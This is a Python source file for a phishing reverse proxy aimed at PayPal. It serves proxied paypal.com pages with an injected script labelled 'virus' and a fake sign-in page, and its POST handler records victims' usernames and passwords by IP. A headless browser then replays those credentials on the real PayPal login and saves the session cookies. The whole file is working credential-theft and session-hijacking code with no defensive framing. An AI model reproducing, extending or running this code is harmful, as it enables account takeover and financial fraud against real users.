#!/usr/bin/env python3
import express
import requests
import browser
from express import http_manager
import re

host="0.0.0.0"
port=5000

domain_routes={
	"domain":"https://www.paypal.com",
	"login":"https://www.paypal.com/signin?country.x=US&locale.x=en_US"
}

headers={
    "Cache-Control":"no-cache, private",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept_Encoding":"gzip, deflate, br",
    "Accept_Language":"en-US,en;q=0.9",
    "Connection":"keep-alive",
    "DNT":"1",
    "Host":domain_routes['domain'].split("//")[1],
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36"
}

virus="<script>" + open('scripts/parasite.js','r',encoding='utf-8').read() + "</script>"

user_data=open("user_data","a")

def user_lookup(ip):
	user_lookup=open('user_data','r').read()
	user_data_regex=ip + "[^\n]+"
	user_data=re.search(user_data_regex,user_lookup).group(0)
	username_password=re.search("username[\'\"]:\s*[\'\"]([^\'\"]+).*?password[\'\"]:\s*[\'\"]([^\'\"]+)",user_data)
	username=username_password.group(1)
	password=username_password.group(2)
	return {'username':username,'password':password}

def browser_login_script(user,password):
	return """
const username=\'"""+user+"""\'
const password=\'"""+password+"""\'
const username_input=document.querySelector('#email');
console.log('username_input:',username_input);
const signin_button=document.querySelector('#btnNext')
console.log('signin_button:',signin_button)
username_input.value=username
signin_button.click()
const password_input=document.querySelector('#password')
password_input.value=password
const login_button=document.querySelector('#btnLogin')
console.log('login_button:',login_button)
setTimeout(function(){
	login_button.click()
},1000)
"""

def browser_login(ip):
	print('browser_login')
	user_pass=user_lookup(ip)
	script=browser_login_script(user_pass['username'],user_pass['password'])
	browser.visit(domain_routes['login'])
	browser.evaluate(script)
	login_html=browser.html()
	cookie=browser.cookie()
	print('cookie:',cookie)
	user_data.write(str({ip:str(cookie)})+"\n")
	user_data.flush()
	return login_html

html_handler_routes={
	"signin":open("static_pages/signin.html","r").read(),
	"/myaccount/summary/":browser_login,
	"/myaccount/summary":browser_login
}

def html_handler(url,query,user_ip):
	if(query.find("signin?country")!=-1):return html_handler_routes['signin']
	try:
		html_getter=html_handler_routes[query]
		if(type(html_getter)==type(browser_login)):
			return html_getter(user_ip)
		else:
			return html_getter
	except Exception:
		pass
	return requests.get(url,headers=headers).text

def inject(html,virus):
	infected_html=re.sub("<\/html>",virus + "</html>",html)
	return infected_html

def ip_formatter(ip_address_tuple):
	return str([ip_address_tuple[0]])

def get(req,res):
	print('get request')
	query=req['query']
	url=domain_routes['domain'] + query
	print('url:',url)
	user_ip=ip_formatter(res.getpeername())
	html=html_handler(url,query,user_ip)
	infected_html=inject(html,virus)
	print('\n')
	return infected_html

def post(req,res):
	try:
		username=req['data']['username']
		password=req['data']['password']
	except Exception as e:
		return ""
	data_string={}
	ip_address_tuple=res.getpeername()
	ip_address=ip_formatter(ip_address_tuple)
	data_string[ip_address]={
		'username':username,
		'password':password
	}
	user_data.write(str(data_string) + "\n")
	user_data.flush()
	print('Writing credentials for:',ip_address)
	return ""

express.get(get)
express.post(post)
express.serve(host,port)